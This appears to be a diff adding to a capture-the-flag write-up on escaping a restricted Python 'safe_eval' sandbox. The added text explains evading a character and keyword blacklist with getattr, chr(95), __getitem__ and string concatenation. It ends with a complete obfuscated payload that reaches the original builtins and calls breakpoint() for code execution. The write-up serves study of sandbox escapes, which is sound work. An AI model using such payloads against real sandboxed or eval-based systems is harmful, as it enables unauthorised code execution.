@@ -66,4 +66,16 @@ if __name__ == "__main__":
 ```
 
 This payload navigates Python's internal structures to reference the original __builtins__ module not the restricted version provided in the script.
-But first we need to find replacements for `_ [ ] .` and other words like `class register builtins breakpoint`
+But first we need to find replacements for `_ [ ] .` and other words like `class register builtins breakpoint`.
+The main key is to exploit the custom builtins set in our `safe_eval` function. Pretty much `print int float` are kinda usless in our case ( maybe print is useful to test ). We can notice that we have the `getattr` function which if you google it you can already find that it can replaces `.` to accessing attributes.
+Another thing in our custom builtins we notice the `chr` function which we can use to replace the `_` by just using `chr(95)`, so now 2 of our major problems are done. 
+We will conduct another search to find alternatives for replacing the use of `[]` in Python and one of the main things we will find is the use of getitem method.
+We are almost done we found a way to replace the main restrictions  `_ [ ] .`. Now we just need to find a way to bypass the restrictions set for the words in the blacklist which pretty easy we need just to concatenate them using `+` for example we change `class` to `'cl'+'ass'`. That's it now we how to bypass everything all we need to do is construct our new payload ( just don't tilt while constructing it ) 
+Our payload should transform from: 
+ ```python
+().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
+```
+to: 
+ ```python
+getattr(getattr(getattr(getattr(getattr(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'subcl'+'asses' + chr(95) + chr(95))(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95))), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))(0), 'regi'+'ster'), chr(95) + chr(95) + 'buil'+'tins' + chr(95) + chr(95)), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))('break'+'point')()
+```
